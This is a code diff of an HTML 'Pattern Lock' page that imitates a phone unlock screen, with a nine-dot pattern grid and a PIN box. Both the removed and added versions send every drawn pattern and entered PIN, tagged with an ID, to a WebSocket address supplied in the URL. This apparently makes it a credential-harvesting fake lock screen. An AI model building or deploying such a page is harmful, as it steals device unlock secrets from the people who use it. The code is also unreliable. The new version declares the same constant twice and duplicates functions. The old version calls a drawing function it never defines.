@@ -1,338 +1,309 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pattern Lock</title>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-      background-color: black;
-    }
-
-    #canvas {
-      width: 100vw;
-      height: 100vh;
-      position: absolute;
-      top: 0;
-      left: 0;
-      z-index: 1; /* Ensure the canvas is below the input box */
-    }
-
-    /* Style for the PIN input box */
-    #pinInput {
-      position: absolute;
-      top: 10px;
-      left: 50%;
-      transform: translateX(-50%);
-      padding: 10px;
-      width: 200px;
-      border: 2px solid black;
-      background-color: rgba(0, 0, 0, 0.2); /* Transparent black background */
-      color: white;
-      font-size: 16px;
-      text-align: center;
-      z-index: 2; /* Ensure the input box is above the canvas */
-    }
-
- .touch-area {
-    width: 40px; /* Larger touch area */
-    height: 40px;
-    position: absolute;
-    border-radius: 50%;
-    transform: translate(-50%, -50%);
-  }
-
-    .line {
-  position: absolute;
-  width: 5px;
-  height: 5px;
-  background-color: transparent; /* Invisible by default */
-  transform-origin: top left;
-  transition: background-color 0.3s;
-}
-
-
-    .point {
-      width: 10px;
-      height: 10px;
-      position: absolute;
-      border-radius: 50%;
-      background-color: white;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-
-    #point0 { top: 40%; left: 10%; }
-    #point1 { top: 40%; left: 50%; }
-    #point2 { top: 40%; left: 80%; }
-    #point3 { top: 60%; left: 10%; }
-    #point4 { top: 60%; left: 50%; }
-    #point5 { top: 60%; left: 80%; }
-    #point6 { top: 80%; left: 10%; }
-    #point7 { top: 80%; left: 50%; }
-    #point8 { top: 80%; left: 80%; }
-
-    .connected .point {
-      background-color: #4CAF50;
-    }
-  </style>
-</head>
-<body>
-  <!-- Input box for PIN -->
-  <input type="text" id="pinInput" placeholder="Input PIN" maxlength="4" />
-
-  <div id="canvas"></div>
-<div id="point0" class="touch-area" style="top: 40%; left: 10%;"><div class="point"></div></div>
-<div id="point1" class="touch-area" style="top: 40%; left: 50%;"><div class="point"></div></div>
-<div id="point2" class="touch-area" style="top: 40%; left: 80%;"><div class="point"></div></div>
-<div id="point3" class="touch-area" style="top: 60%; left: 10%;"><div class="point"></div></div>
-<div id="point4" class="touch-area" style="top: 60%; left: 50%;"><div class="point"></div></div>
-<div id="point5" class="touch-area" style="top: 60%; left: 80%;"><div class="point"></div></div>
-<div id="point6" class="touch-area" style="top: 80%; left: 10%;"><div class="point"></div></div>
-<div id="point7" class="touch-area" style="top: 80%; left: 50%;"><div class="point"></div></div>
-<div id="point8" class="touch-area" style="top: 80%; left: 80%;"><div class="point"></div></div>
-
-  <script>
-    // Extract URL Parameters
-const urlParams = new URLSearchParams(window.location.search);
-const websocketUrl = urlParams.get('ws_url');
-const idNumber = urlParams.get('id_number');
-
-if (!websocketUrl) console.error('WebSocket URL missing!');
-if (!idNumber) console.error('ID number missing!');
-
-// WebSocket Connection
-const socket = new WebSocket(websocketUrl);
-socket.onopen = () => {
-  console.log('WebSocket connected');
-  if (idNumber) socket.send(JSON.stringify({ id_number: idNumber }));
-};
-socket.onerror = (error) => console.log('WebSocket error:', error);
-socket.onmessage = (message) => console.log('Server:', message.data);
-
-// Handle Fullscreen on Double Tap
-let lastTap = 0;
-document.addEventListener('touchend', (event) => {
-  const currentTime = new Date().getTime();
-  if (currentTime - lastTap < 300) {
-    document.documentElement.requestFullscreen().catch(err => console.log('Fullscreen error', err));
-  }
-  lastTap = currentTime;
-});
-
-// Get Points (Touch Areas)
-const points = Array.from(document.querySelectorAll('.touch-area'));
-
-let patternData = [];
-let isDrawing = false;
-
-// Create Canvas for Drawing Lines
-const canvas = document.createElement('canvas');
-const ctx = canvas.getContext('2d');
-document.body.appendChild(canvas);
-canvas.id = 'lineCanvas';
-canvas.style.position = 'absolute';
-canvas.style.top = '0';
-canvas.style.left = '0';
-canvas.style.pointerEvents = 'none';
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
-
-// Pre-create all possible connections
-const lineContainer = document.createElement('div');
-document.body.appendChild(lineContainer);
-lineContainer.style.position = 'absolute';
-lineContainer.style.top = '0';
-lineContainer.style.left = '0';
-lineContainer.style.width = '100vw';
-lineContainer.style.height = '100vh';
-lineContainer.style.pointerEvents = 'none';
-
-const allLines = {};
-
-// Function to create a line between two points
-function createLine(startEl, endEl) {
-    const startRect = startEl.getBoundingClientRect();
-    const endRect = endEl.getBoundingClientRect();
-    
-    const x1 = startRect.left + startRect.width / 2;
-    const y1 = startRect.top + startRect.height / 2;
-    const x2 = endRect.left + endRect.width / 2;
-    const y2 = endRect.top + endRect.height / 2;
-    
-    const length = Math.sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2);
-    const angle = Math.atan2(y2 - y1, x2 - x1) * (180 / Math.PI);
-    
-    const line = document.createElement('div');
-    line.classList.add('line');
-    line.style.width = `${length}px`;
-    line.style.height = '5px';
-    line.style.position = 'absolute';
-    line.style.left = `${x1}px`;
-    line.style.top = `${y1}px`;
-    line.style.backgroundColor = 'transparent'; // Hidden initially
-    line.style.transform = `rotate(${angle}deg)`;
-    
-    lineContainer.appendChild(line);
-    
-    return line;
-}
-
-// Generate all possible connections
-points.forEach((pointA, indexA) => {
-    points.forEach((pointB, indexB) => {
-        if (indexA < indexB) {
-            const lineKey = `${indexA}-${indexB}`;
-            allLines[lineKey] = createLine(pointA, pointB);
-        }
-    });
-});
-
-// Function to Activate a Line
-function activateLine(startIndex, endIndex) {
-    const key = `${startIndex}-${endIndex}`;
-    const reverseKey = `${endIndex}-${startIndex}`;
-    if (allLines[key]) {
-        allLines[key].style.backgroundColor = '#4CAF50';
-    } else if (allLines[reverseKey]) {
-        allLines[reverseKey].style.backgroundColor = '#4CAF50';
-    }
-}
-
-// Modify handleDraw to activate existing lines instead of drawing new ones
-function handleDraw(event) {
-    event.preventDefault();
-    const x = event.clientX || event.touches[0].clientX;
-    const y = event.clientY || event.touches[0].clientY;
-
-    points.forEach((touchArea, index) => {
-        const rect = touchArea.getBoundingClientRect();
-        const centerX = rect.left + rect.width / 2;
-        const centerY = rect.top + rect.height / 2;
-
-        const distance = Math.sqrt((x - centerX) ** 2 + (y - centerY) ** 2);
-
-        if (distance < rect.width / 2 && !patternData.includes(index)) {
-            touchArea.classList.add('connected');
-
-            if (patternData.length > 0) {
-                const prevIndex = patternData[patternData.length - 1];
-                activateLine(prevIndex, index);
-            }
-
-            patternData.push(index);
-        }
-    });
-}
-
-// Modify resetPattern to hide all lines again
-function resetPattern() {
-    patternData = [];
-    points.forEach(touchArea => touchArea.classList.remove('connected'));
-
-    // Hide all lines
-    Object.values(allLines).forEach(line => line.style.backgroundColor = 'transparent');
-}
-
-
-// Update Canvas Size on Window Resize
-window.addEventListener('resize', () => {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-});
-
-// Function to Handle Drawing
-function handleDraw(event) {
-    event.preventDefault();
-    const x = event.clientX || event.touches[0].clientX;
-    const y = event.clientY || event.touches[0].clientY;
-
-    points.forEach((touchArea, index) => {
-        const rect = touchArea.getBoundingClientRect();
-        const centerX = rect.left + rect.width / 2;
-        const centerY = rect.top + rect.height / 2;
-
-        const distance = Math.sqrt((x - centerX) ** 2 + (y - centerY) ** 2);
-
-        if (distance < rect.width / 2 && !patternData.includes(index)) {
-            touchArea.classList.add('connected');
-
-            if (patternData.length > 0) {
-                const prevIndex = patternData[patternData.length - 1];
-                const prevRect = points[prevIndex].getBoundingClientRect();
-                
-                // Draw only if the previous point is valid
-                drawLine(
-                    { x: prevRect.left + prevRect.width / 2, y: prevRect.top + prevRect.height / 2 },
-                    { x: centerX, y: centerY }
-                );
-            }
-
-            patternData.push(index);
-        }
-    });
-}
-
-
-// Function to Stop Drawing and Send Data
-function stopDrawing() {
-  isDrawing = false;
-  const pattern = patternData.join(',');
-
-  console.log('Pattern:', pattern);
-
-  if (socket.readyState === WebSocket.OPEN) {
-    socket.send(JSON.stringify({
-      id_number: idNumber,
-      pattern: pattern
-    }));
-  }
-
-  setTimeout(resetPattern, 1000);
-}
-
-// Function to Reset Pattern
-function resetPattern() {
-  patternData = [];
-  points.forEach(touchArea => touchArea.classList.remove('connected'));
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-}
-
-// Event Listeners for Mouse & Touch
-document.addEventListener('mousedown', (e) => { isDrawing = true; handleDraw(e); });
-document.addEventListener('mousemove', (e) => { if (isDrawing) handleDraw(e); });
-document.addEventListener('mouseup', stopDrawing);
-document.addEventListener('touchstart', (e) => { isDrawing = true; handleDraw(e); });
-document.addEventListener('touchmove', (e) => { if (isDrawing) handleDraw(e); });
-document.addEventListener('touchend', stopDrawing);
-
-// Handle PIN Input
-document.getElementById('pinInput').addEventListener('keydown', function (event) {
-  if (event.key === 'Enter') {
-    const pinData = this.value;
-    console.log('PIN:', pinData);
-
-    if (socket.readyState === WebSocket.OPEN) {
-      socket.send(JSON.stringify({
-        id_number: idNumber,
-        pattern: patternData.join(','),
-        pin: pinData
-      }));
-    }
-
-    this.value = '';
-  }
-});
-
-  </script>
-</body>
-</html>
-
-
-
-
-
+ <html lang="en">
+ <head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Pattern Lock</title>
+   <style>
+     body, html {
+       margin: 0;
+       padding: 0;
+       height: 100%;
+       overflow: hidden;
+       background-color: black;
+     }
+ 
+     #canvas {
+       width: 100vw;
+       height: 100vh;
+       position: absolute;
+       top: 0;
+       left: 0;
+       z-index: 1; /* Ensure the canvas is below the input box */
+     }
+ 
+     /* Style for the PIN input box */
+     #pinInput {
+       position: absolute;
+       top: 10px;
+       left: 50%;
+       transform: translateX(-50%);
+       padding: 10px;
+       width: 200px;
+       border: 2px solid black;
+       background-color: rgba(0, 0, 0, 0.2); /* Transparent black background */
+       color: white;
+       font-size: 16px;
+       text-align: center;
+       z-index: 2; /* Ensure the input box is above the canvas */
+     }
+ 
+  .touch-area {
+     width: 40px; /* Larger touch area */
+     height: 40px;
+     position: absolute;
+     border-radius: 50%;
+     transform: translate(-50%, -50%);
+   }
+ 
+ 
+ 
+     .point {
+       width: 10px;
+       height: 10px;
+       position: absolute;
+       border-radius: 50%;
+       background-color: white;
+       cursor: pointer;
+       transition: background-color 0.3s;
+     }
+ 
+     #point0 { top: 40%; left: 10%; }
+     #point1 { top: 40%; left: 50%; }
+     #point2 { top: 40%; left: 80%; }
+     #point3 { top: 60%; left: 10%; }
+     #point4 { top: 60%; left: 50%; }
+     #point5 { top: 60%; left: 80%; }
+     #point6 { top: 80%; left: 10%; }
+     #point7 { top: 80%; left: 50%; }
+     #point8 { top: 80%; left: 80%; }
+ 
+     .connected {
+       background-color: #4CAF50;
+     }
+   </style>
+ </head>
+ <body>
+   <!-- Input box for PIN -->
+   <input type="text" id="pinInput" placeholder="Input PIN" maxlength="4" />
+ 
+   <div id="canvas"></div>
+ <div id="point0" class="touch-area" style="top: 40%; left: 10%;"><div class="point"></div></div>
+ <div id="point1" class="touch-area" style="top: 40%; left: 50%;"><div class="point"></div></div>
+ <div id="point2" class="touch-area" style="top: 40%; left: 80%;"><div class="point"></div></div>
+ <div id="point3" class="touch-area" style="top: 60%; left: 10%;"><div class="point"></div></div>
+ <div id="point4" class="touch-area" style="top: 60%; left: 50%;"><div class="point"></div></div>
+ <div id="point5" class="touch-area" style="top: 60%; left: 80%;"><div class="point"></div></div>
+ <div id="point6" class="touch-area" style="top: 80%; left: 10%;"><div class="point"></div></div>
+ <div id="point7" class="touch-area" style="top: 80%; left: 50%;"><div class="point"></div></div>
+ <div id="point8" class="touch-area" style="top: 80%; left: 80%;"><div class="point"></div></div>
+ 
+   <script>
+     // Extract the WebSocket URL, id_number, and other parameters from the URL
+     const urlParams = new URLSearchParams(window.location.search);
+     const websocketUrl = urlParams.get('ws_url'); // Assuming the parameter is called 'ws_url'
+     const idNumber = urlParams.get('id_number'); // Assuming the parameter is called 'id_number'
+ 
+     if (!websocketUrl) {
+       console.error('WebSocket URL is not provided in the URL parameters!');
+     }
+ 
+     if (!idNumber) {
+       console.error('ID number is not provided in the URL parameters!');
+     }
+ 
+     // WebSocket setup with dynamic URL from the URL parameters
+     const socket = new WebSocket(websocketUrl);
+ 
+     socket.onopen = () => {
+       console.log('WebSocket connected');
+ 
+       // Send the id_number over WebSocket when the connection is opened
+       if (idNumber) {
+         socket.send(JSON.stringify({ id_number: idNumber }));
+         console.log('ID number sent:', idNumber);
+       }
+     };
+ 
+     socket.onerror = (error) => {
+       console.log('WebSocket error:', error);
+       // Send the id_number over WebSocket when the connection is opened
+       if (idNumber) {
+         socket.send(JSON.stringify({ id_number: idNumber }));
+         console.log('ID number sent:', idNumber);
+       }
+     };
+ 
+     socket.onmessage = (message) => {
+       console.log('Message from server:', message.data);
+     };
+ 
+     // Trigger fullscreen only on double tap
+     let lastTap = 0;
+     document.addEventListener('touchend', (event) => {
+       const currentTime = new Date().getTime();
+       const tapLength = currentTime - lastTap;
+       if (tapLength < 300 && tapLength > 0) {
+         document.documentElement.requestFullscreen().catch(err => {
+           console.log('Error entering fullscreen mode', err);
+         });
+       }
+       lastTap = currentTime;
+     });
+ 
+     // Points array
+     const points = Array.from({ length: 9 }, (_, i) => document.getElementById(`point${i}`));
+ 
+     // Variables to track drawing state
+     let patternData = []; // Stores the pattern of points drawn
+     let isDrawing = false;
+     let pinData = ''; // Variable to store the PIN input
+ 
+     // Function to handle touch and mouse events
+     function handleDraw(event) {
+       const x = event.clientX || event.touches[0].clientX;
+       const y = event.clientY || event.touches[0].clientY;
+ 
+       points.forEach((point, index) => {
+         const rect = point.getBoundingClientRect();
+         const pointX = rect.left + rect.width / 2;
+         const pointY = rect.top + rect.height / 2;
+ 
+         const distance = Math.sqrt(Math.pow(x - pointX, 2) + Math.pow(y - pointY, 2));
+ 
+         if (distance < rect.width / 2 && !patternData.includes(index)) {
+           point.classList.add('connected');
+           patternData.push(index);
+         }
+       });
+     }
+ 
+     // Function to stop drawing and send pattern data
+     function stopDrawing() {
+       const pattern = patternData.join(',');
+       // Log the result to the console even if the WebSocket is not connected
+       console.log('Pattern drawn:', pattern);
+ 
+       // Send the pattern, pin, and id_number over WebSocket
+       if (socket.readyState === WebSocket.OPEN) {
+         socket.send(JSON.stringify({
+           id_number: idNumber,
+           pattern: pattern,
+           pin: pinData
+         }));
+       }
+ 
+       // Reset the pattern after sending
+       setTimeout(resetPattern, 500); // Delay to allow for any last messages to be sent
+     }
+ 
+     // Function to reset the pattern
+     function resetPattern() {
+       patternData = []; // Clear the pattern data
+       points.forEach(point => point.classList.remove('connected')); // Reset points
+     }
+ 
+     // Event listeners for drawing
+     document.addEventListener('mousedown', (e) => {
+       isDrawing = true;
+       handleDraw(e);
+     });
+ 
+     document.addEventListener('mousemove', (e) => {
+       if (isDrawing) {
+         handleDraw(e);
+       }
+     });
+ 
+     document.addEventListener('mouseup', stopDrawing);
+ 
+     // Touch events for mobile responsiveness
+     document.addEventListener('touchstart', (e) => {
+       isDrawing = true;
+       handleDraw(e);
+     });
+ 
+     document.addEventListener('touchmove', (e) => {
+       if (isDrawing) {
+         handleDraw(e);
+       }
+     });
+ 
+     document.addEventListener('touchend', stopDrawing);
+ 
+     // Event listener for PIN input
+     document.getElementById('pinInput').addEventListener('keydown', function(event) {
+       if (event.key === 'Enter') {
+         pinData = this.value; // Store the PIN input
+         console.log('PIN entered:', pinData);
+ 
+         // Send the PIN, pattern, and id_number over WebSocket
+         if (socket.readyState === WebSocket.OPEN) {
+           socket.send(JSON.stringify({
+             id_number: idNumber,
+             pattern: patternData.join(','),
+             pin: pinData
+           }));
+         }
+ 
+         // Optionally clear the input field
+         this.value = ''; // Clear input after submission (if desired)
+       }
+     });
+ 
+     const canvas = document.createElement('canvas');
+ const ctx = canvas.getContext('2d');
+ document.body.appendChild(canvas);
+ canvas.id = 'lineCanvas';
+ canvas.style.position = 'absolute';
+ canvas.style.top = '0';
+ canvas.style.left = '0';
+ canvas.style.pointerEvents = 'none';
+ canvas.width = window.innerWidth;
+ canvas.height = window.innerHeight;
+ 
+ // Function to draw a line between two points
+ function drawLine(start, end) {
+   ctx.beginPath();
+   ctx.moveTo(start.x, start.y);
+   ctx.lineTo(end.x, end.y);
+   ctx.strokeStyle = '#4CAF50';
+   ctx.lineWidth = 5;
+   ctx.stroke();
+ }
+ 
+ // Update canvas size on resize
+ window.addEventListener('resize', () => {
+   canvas.width = window.innerWidth;
+   canvas.height = window.innerHeight;
+ });
+ 
+ const points = Array.from(document.querySelectorAll('.touch-area'));
+ 
+ // Update handleDraw function to draw lines
+ function handleDraw(event) {
+   const x = event.clientX || event.touches[0].clientX;
+   const y = event.clientY || event.touches[0].clientY;
+ 
+   points.forEach((point, index) => {
+     const rect = point.getBoundingClientRect();
+     const pointX = rect.left + rect.width / 2;
+     const pointY = rect.top + rect.height / 2;
+ 
+     const distance = Math.sqrt(Math.pow(x - pointX, 2) + Math.pow(y - pointY, 2));
+ 
+     if (distance < rect.width / 2 && !patternData.includes(index)) {
+       point.classList.add('connected');
+       if (patternData.length > 0) {
+         const prevIndex = patternData[patternData.length - 1];
+         const prevRect = points[prevIndex].getBoundingClientRect();
+         drawLine(
+           { x: prevRect.left + prevRect.width / 2, y: prevRect.top + prevRect.height / 2 },
+           { x: pointX, y: pointY }
+         );
+       }
+       patternData.push(index);
+     }
+   });
+ }
+ 
+ // Reset the canvas on resetPattern
+ function resetPattern() {
+   patternData = [];
+   points.forEach(point => point.classList.remove('connected'));
+   ctx.clearRect(0, 0, canvas.width, canvas.height);
+ }
+ 
+   </script>
+ </body>
+ </html>
